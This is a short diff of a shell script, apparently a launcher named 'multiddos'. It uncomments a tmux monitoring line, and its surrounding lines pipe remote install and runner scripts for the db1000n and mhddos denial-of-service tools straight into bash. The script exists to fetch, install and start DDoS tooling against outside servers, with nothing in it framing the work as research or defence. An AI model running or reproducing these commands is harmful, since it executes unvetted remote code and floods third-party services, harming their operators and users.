@@ -24,7 +24,7 @@ mkdir multiddos
 cd multiddos
 curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
 
-#tmux new-session -s multiddos -d 'gotop -asc solarized'
+tmux new-session -s multiddos -d 'gotop -asc solarized'
 gotop -asc solarized
 sleep 0.1
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
